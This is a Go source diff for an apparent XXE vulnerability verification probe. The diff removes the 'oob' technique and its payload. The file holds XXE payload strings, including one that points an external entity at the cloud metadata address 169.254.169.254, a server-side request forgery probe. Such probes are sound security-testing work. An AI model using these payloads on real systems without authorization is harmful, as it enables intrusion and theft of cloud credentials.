@@ -12,7 +12,7 @@ import (
 type XXEConfig struct {
 	URL       string
 	Method    string // typically POST
-	Technique string // file_read | ssrf | oob
+	Technique string // file_read | ssrf
 	ProbeConfig
 }
 
@@ -27,12 +27,6 @@ var xxePayloads = map[string]string{
   <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
 ]>
 <root><data>&xxe;</data></root>`,
-	"oob": `<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [
-  <!ENTITY % xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
-  %xxe;
-]>
-<root><data>test</data></root>`,
 }
 
 var xxeSignatures = []string{
@@ -41,7 +35,7 @@ var xxeSignatures = []string{
 }
 
 var validXXETechniques = map[string]bool{
-	"file_read": true, "ssrf": true, "oob": true,
+	"file_read": true, "ssrf": true,
 }
 
 // VerifyXXE runs the XXE verification probe.
@@ -55,7 +49,7 @@ func VerifyXXE(cfg XXEConfig) (*ProbeResult, error) {
 	}
 
 	if !validXXETechniques[cfg.Technique] {
-		return nil, &ScopeError{Msg: fmt.Sprintf("unsupported technique %q — use: file_read, ssrf, oob", cfg.Technique)}
+		return nil, &ScopeError{Msg: fmt.Sprintf("unsupported technique %q — use: file_read, ssrf", cfg.Technique)}
 	}
 
 	timer := NewTimer()
